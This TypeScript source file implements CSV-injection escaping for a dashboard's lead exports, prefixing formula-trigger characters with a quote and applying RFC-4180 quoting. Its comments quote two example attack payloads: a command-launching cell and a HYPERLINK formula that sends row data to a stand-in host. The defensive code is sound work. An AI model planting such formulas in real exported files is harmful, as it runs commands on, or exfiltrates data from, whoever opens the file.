/**
 * CSV-injection escaping for any client-side export.
 *
 * In `lib/` rather than beside its first caller because the dashboard builds
 * CSVs in more than one place, and a copy-per-feature defence is one new
 * export away from being a copy-per-feature hole. Mirrors `csv_safe` in
 * `api/app/core/csv_safety.py`, the two must agree, because the same lead can
 * leave the product through either the server export or "Export selected".
 *
 * Prefer `csvField` over calling `csvSafe` directly: it is the funnel form, and
 * it pairs the injection defence with the RFC-4180 quoting no cell can go
 * without. That mirrors the `csv_safe` / `csv_safe_row` split on the backend,
 * where the same reasoning put both halves in one module.
 */

/**
 * Leading characters that make a spreadsheet treat a cell as a formula rather
 * than as text. `=` and `@` start a formula outright; `+`/`-` start a signed
 * expression; a leading TAB or CR is stripped by Excel before it makes that
 * decision, so `\t=cmd|'/c calc'!A0` slips a formula past a naive
 * first-character check. OWASP's CSV-injection list, in full.
 */
const CSV_FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'] as const;

/**
 * Neutralise a spreadsheet formula hiding in an untrusted string.
 *
 * Lead names, emails, companies and locations are typed by website visitors
 * and land verbatim in a file the customer opens in Excel. A company of
 * `=HYPERLINK("https://evil.test/?"&A2,"Click")` would execute on open and
 * exfiltrate the rest of the row.
 *
 * The fix is to stop the cell from ever *starting* with a formula trigger:
 * prefix it with a single quote, which every spreadsheet reads as "the rest of
 * this cell is literal text". RFC-4180 quoting is a separate concern and does
 * NOT help here. Excel evaluates `"=1+1"` exactly as it evaluates `=1+1`.
 */
export function csvSafe(value: string): string {
  return CSV_FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix)) ? `'${value}` : value;
}

/**
 * Escape one CSV cell. Two independent defences, in order:
 *
 * 1. `csvSafe` stops a visitor-typed value from opening as a formula in the
 *    recipient's spreadsheet. Every cell goes through it, the columns are
 *    almost entirely visitor-supplied, and routing them all through one funnel
 *    means a column added later is safe without anyone remembering to be.
 * 2. RFC-4180 quoting keeps commas, quotes and newlines from breaking the
 *    record apart. It does nothing for defence 1: Excel evaluates `"=1+1"`
 *    exactly as it evaluates `=1+1`.
 *
 * Takes `number | null | undefined` as well as `string` because the callers
 * genuinely have all four: a lead's score is a number, and every optional
 * contact field is `string | undefined`. A missing value becomes an empty cell
 * rather than the string `"undefined"`, which is what a CRM importing the file
 * needs to read as "no value".
 */
export function csvField(value: string | number | null | undefined): string {
  const raw = value === null || value === undefined ? '' : String(value);
  return `"${csvSafe(raw).replace(/"/g, '""')}"`;
}
